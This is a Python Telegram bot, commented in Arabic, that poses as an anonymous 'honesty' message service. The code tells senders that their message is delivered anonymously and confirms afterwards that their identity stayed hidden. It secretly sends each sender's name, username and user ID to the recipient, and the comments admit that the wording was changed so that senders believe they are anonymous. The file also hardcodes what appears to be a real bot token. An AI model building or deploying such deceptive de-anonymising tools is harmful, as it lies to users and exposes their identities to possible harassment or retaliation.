
import telebot
from telebot import types

# التوكن واليوزر الخاصين ببوتك
BOT_TOKEN = "8682801321:AAEBx5KjhdYSVCZMZIJck-JgM36Osr_Bz2Y"
BOT_USERNAME = "Sarrh1bot"

bot = telebot.TeleBot(BOT_TOKEN)

# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل
users_db = {}      # التخزين: {user_id: {"blocked_users": set()}}
messages_db = {}   # لربط رقم الرسالة بمعرّف المُرسل: {msg_id: sender_id}
msg_counter = 0

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    text_args = message.text.split()
    
    if user_id not in users_db:
        users_db[user_id] = {"blocked_users": set()}
        
    # إذا دخل المستخدم عن طريق رابط الحساب (يريد إرسال رسالة مجهولة)
    if len(text_args) > 1 and text_args[1].isdigit():
        target_id = int(text_args[1])
        
        if target_id == user_id:
            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
            return
            
        # تم تعديل النص هنا ليظن المرسل أنها مجهولة تماماً 🤫
        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها بشكل مجهول وسري تماماً:")
        bot.register_next_step_handler(message, process_anonymous_message, target_id)
        return

    # عرض رابط الاستقبال الخاص بالمستخدم
    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    welcome_text = (
        "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
        f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
    )
    bot.send_message(user_id, welcome_text, parse_mode="Markdown")

def process_anonymous_message(message, target_id):
    global msg_counter
    sender_id = message.from_user.id
    
    # التحقق من الحظر
    if target_id in users_db and sender_id in users_db[target_id]["blocked_users"]:
        bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
        return

    if message.content_type != 'text':
        bot.send_message(sender_id, "⚠️ البوت يدعم الرسائل النصية فقط حالياً.")
        return

    msg_counter += 1
    messages_db[msg_counter] = sender_id

    # إنشاء زر الحظر
    markup = types.InlineKeyboardMarkup()
    block_button = types.InlineKeyboardButton(
        text="🚫 حظر هذا المستخدم", 
        callback_data=f"block_{msg_counter}"
    )
    markup.add(block_button)

    # تجهيز بيانات المُرسِل لكشف هويته لك فوراً بالخلفية
    first_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
    
    info_text = (
        f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
        f"💬 **الرسالة:** {message.text}\n\n"
        f"─── معلومات المُرسِل السرية ───\n"
        f"👤 **الاسم:** {first_name}\n"
        f"🔗 **المعرف:** {username}\n"
        f"🆔 **الـ ID:** `{sender_id}`"
    )

    # إرسال الرسالة مع البيانات للشخص المستهدف (أنت)
    try:
        bot.send_message(target_id, info_text, reply_markup=markup, parse_mode="Markdown")
        # تم تعديل النص هنا ليؤكد للمرسل أن هويته لم تُكشف
        bot.send_message(sender_id, "✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
    except Exception as e:
        bot.send_message(sender_id, "❌ فشل إرسال الرسالة، قد يكون المستخدم قام بتعطيل البوت.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('block_'))
def handle_block_callback(call):
    receiver_id = call.from_user.id
    msg_id = int(call.data.split('_')[1])
    
    sender_id = messages_db.get(msg_id)
    
    if not sender_id:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية هذا الإجراء أو البيانات غير متوفرة.")
        return

    if receiver_id not in users_db:
        users_db[receiver_id] = {"blocked_users": set()}

    users_db[receiver_id]["blocked_users"].add(sender_id)
    
    # تحديث نص الرسالة لتأكيد الحظر
    bot.edit_message_text(
        chat_id=receiver_id,
        message_id=call.message.message_id,
        text=f"{call.message.text}\n\n🚫 [تم حظر هذا المستخدم بنجاح ولن تصلك رسائل منه]"
    )
    bot.answer_callback_query(call.id, "🎯 تم الحظر بنجاح!")

if __name__ == "__main__":
    print("🧹 جاري حذف الـ Webhook القديم وتنظيف الاتصال بالخادم...")
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("✅ تم تنظيف الاتصال بنجاح!")
    except Exception as e:
        print(f"⚠️ فشل حذف الـ Webhook: {e}")
        
    print("🤖 البوت يعمل الآن بنظام صراحة المموّه (كشف الهوية للمستقبل فقط)...")
    bot.infinity_polling()
